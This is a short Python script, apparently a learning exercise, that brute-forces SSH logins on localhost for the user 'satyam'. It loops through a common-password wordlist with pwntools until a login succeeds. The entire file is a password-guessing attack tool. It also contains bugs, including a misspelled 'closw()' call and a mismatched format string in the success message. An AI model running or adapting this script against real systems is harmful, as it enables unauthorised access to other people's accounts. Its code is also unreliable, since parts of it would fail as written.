from pwn import *

import paramiko

host = "127.0.0.1"
username = "satyam"
attempts = 0

with open("ssh_common-password.txt","r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("{:-} valid password found: '{}!".format(password))
				response.closw()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
		   print("[no] Invalid password:")
		attempts += 1   	   